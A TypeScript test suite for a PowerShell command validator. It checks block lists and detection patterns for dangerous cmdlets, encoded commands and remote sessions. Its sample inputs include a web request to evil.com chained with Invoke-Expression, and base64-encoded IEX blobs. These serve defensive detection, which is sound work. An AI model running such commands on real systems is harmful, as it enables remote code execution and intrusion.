import { describe, expect, test } from "bun:test"
import {
  DANGEROUS_CMDLETS,
  HIGH_SEVERITY_CMDLETS,
  ENCODED_COMMAND_PATTERNS,
  REMOTE_EXECUTION_PATTERNS,
  containsDangerousCmdlets,
  containsHighSeverityCmdlets,
  validatePowerShellCommand,
  getDangerousCmdletSummary,
  type DangerSeverity,
} from "../../src/security/powershell"

/**
 * PowerShell Security Module Tests
 *
 * Tests for dangerous cmdlet detection in PowerShell commands,
 * based on Claude Code's dangerousCmdlets.ts.
 */

describe("dangerous cmdlets list", () => {
  test("contains code execution cmdlets", () => {
    expect(DANGEROUS_CMDLETS).toContain("Invoke-Expression")
    expect(DANGEROUS_CMDLETS).toContain("Invoke-Command")
    expect(DANGEROUS_CMDLETS).toContain("iex") // Alias
  })

  test("contains network cmdlets", () => {
    expect(DANGEROUS_CMDLETS).toContain("Invoke-WebRequest")
    expect(DANGEROUS_CMDLETS).toContain("Invoke-RestMethod")
    expect(DANGEROUS_CMDLETS).toContain("iwr") // Alias
  })

  test("contains privilege escalation cmdlets", () => {
    expect(DANGEROUS_CMDLETS).toContain("Start-Process -Verb RunAs")
    expect(DANGEROUS_CMDLETS).toContain("runas.exe")
    expect(DANGEROUS_CMDLETS).toContain("sudo")
  })

  test("contains encoded command patterns", () => {
    expect(DANGEROUS_CMDLETS).toContain("powershell -enc")
    expect(DANGEROUS_CMDLETS).toContain("powershell -EncodedCommand")
  })
})

describe("high severity cmdlets", () => {
  test("high severity list is subset of dangerous cmdlets", () => {
    for (const cmdlet of HIGH_SEVERITY_CMDLETS) {
      expect(DANGEROUS_CMDLETS).toContain(cmdlet)
    }
  })

  test("Invoke-Expression is high severity", () => {
    expect(HIGH_SEVERITY_CMDLETS).toContain("Invoke-Expression")
  })

  test("encoded commands are high severity", () => {
    expect(HIGH_SEVERITY_CMDLETS).toContain("powershell -enc")
    expect(HIGH_SEVERITY_CMDLETS).toContain("powershell -EncodedCommand")
  })
})

describe("encoded command detection", () => {
  test("detects -EncodedCommand flag", () => {
    const cmd = "powershell -EncodedCommand SQBFAFgAIAA="
    const found = ENCODED_COMMAND_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("Encoded")
  })

  test("detects short -e flag", () => {
    const cmd = "pwsh -e SQBFAFgAIAA="
    const found = ENCODED_COMMAND_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("Encoded")
  })

  test("detects FromBase64String", () => {
    const cmd = "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('test'))"
    const found = ENCODED_COMMAND_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("Base64")
  })
})

describe("remote execution detection", () => {
  test("detects -ComputerName parameter", () => {
    const cmd = "Invoke-Command -ComputerName server01 -ScriptBlock { Get-Process }"
    const found = REMOTE_EXECUTION_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("Remote")
  })

  test("detects -Session parameter", () => {
    const cmd = "Invoke-Command -Session $session -ScriptBlock { ipconfig }"
    const found = REMOTE_EXECUTION_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("Session")
  })

  test("detects Enter-PSSession", () => {
    const cmd = "Enter-PSSession -ComputerName server01"
    const found = REMOTE_EXECUTION_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("PSSession")
  })

  test("detects New-PSSession", () => {
    const cmd = "New-PSSession -ComputerName server01"
    const found = REMOTE_EXECUTION_PATTERNS.find((p) => p.pattern.test(cmd))
    expect(found?.message).toContain("PSSession")
  })
})

describe("containsDangerousCmdlets", () => {
  test("detects Invoke-Expression", () => {
    expect(containsDangerousCmdlets("Invoke-Expression '$env:VAR'")).toBe(true)
  })

  test("detects Invoke-WebRequest", () => {
    expect(containsDangerousCmdlets("Invoke-WebRequest -Uri https://evil.com")).toBe(true)
  })

  test("detects encoded commands", () => {
    expect(containsDangerousCmdlets("powershell -EncodedCommand SQBFAFgAIAA=")).toBe(true)
  })

  test("safe commands return false", () => {
    expect(containsDangerousCmdlets("Get-Process")).toBe(false)
    expect(containsDangerousCmdlets("Get-Service")).toBe(false)
    expect(containsDangerousCmdlets("Get-ChildItem")).toBe(false)
  })

  test("is case insensitive", () => {
    expect(containsDangerousCmdlets("invoke-expression 'echo hello'")).toBe(true)
    expect(containsDangerousCmdlets("INVOKE-EXPRESSION 'echo hello'")).toBe(true)
  })
})

describe("containsHighSeverityCmdlets", () => {
  test("detects Invoke-Expression as high severity", () => {
    expect(containsHighSeverityCmdlets("Invoke-Expression '$env:VAR'")).toBe(true)
  })

  test("safe commands return false", () => {
    expect(containsHighSeverityCmdlets("Get-Process")).toBe(false)
    expect(containsHighSeverityCmdlets("Get-Service")).toBe(false)
  })

  test("medium severity commands return false", () => {
    expect(containsHighSeverityCmdlets("Get-WmiObject Win32_Process")).toBe(false)
  })
})

describe("validatePowerShellCommand", () => {
  test("safe command is valid", () => {
    const result = validatePowerShellCommand("Get-Process | Select-Object Name")
    expect(result.valid).toBe(true)
    expect(result.severity).toBe("safe")
  })

  test("Invoke-Expression is invalid and high severity", () => {
    const result = validatePowerShellCommand("Invoke-Expression 'whoami'")
    expect(result.valid).toBe(false)
    expect(result.severity).toBe("high")
  })

  test("encoded command is invalid and high severity", () => {
    const result = validatePowerShellCommand("powershell -enc SQBFAFgAIAA=")
    expect(result.valid).toBe(false)
    expect(result.severity).toBe("high")
  })

  test("Get-WmiObject is invalid but medium severity", () => {
    const result = validatePowerShellCommand("Get-WmiObject -Class Win32_Process")
    expect(result.valid).toBe(false)
    expect(result.severity).toBe("medium")
  })

  test("returns matched checks", () => {
    const result = validatePowerShellCommand("Invoke-Expression 'whoami'")
    expect(result.checks.length).toBeGreaterThan(0)
    expect(result.checks.some((c) => c.matched)).toBe(true)
  })

  test("multiple dangerous cmdlets reports highest severity", () => {
    const cmd = "Invoke-WebRequest -Uri https://evil.com; Invoke-Expression 'echo pwned'"
    const result = validatePowerShellCommand(cmd)
    expect(result.valid).toBe(false)
    expect(result.severity).toBe("high")
  })
})

describe("getDangerousCmdletSummary", () => {
  test("returns null for safe commands", () => {
    const summary = getDangerousCmdletSummary("Get-Process")
    expect(summary).toBeNull()
  })

  test("returns summary for dangerous commands", () => {
    const summary = getDangerousCmdletSummary("Invoke-Expression 'whoami'")
    expect(summary).not.toBeNull()
    expect(summary).toContain("HIGH")
  })

  test("includes cmdlet name in summary", () => {
    const summary = getDangerousCmdletSummary("powershell -enc SQBFAFgAIAA=")
    expect(summary).toContain("Encoded")
  })
})

describe("case sensitivity", () => {
  test("cmdlet detection is case insensitive", () => {
    expect(containsDangerousCmdlets("invoke-expression 'echo hello'")).toBe(true)
    expect(containsDangerousCmdlets("INVOKE-EXPRESSION 'echo hello'")).toBe(true)
    expect(containsDangerousCmdlets("InVoKe-ExPrEsSiOn 'echo hello'")).toBe(true)
  })

  test("partial matches work correctly", () => {
    expect(containsDangerousCmdlets("echo 'Invoke-Expression'")).toBe(true)
    expect(containsDangerousCmdlets("some text Invoke-Command more text")).toBe(true)
  })
})
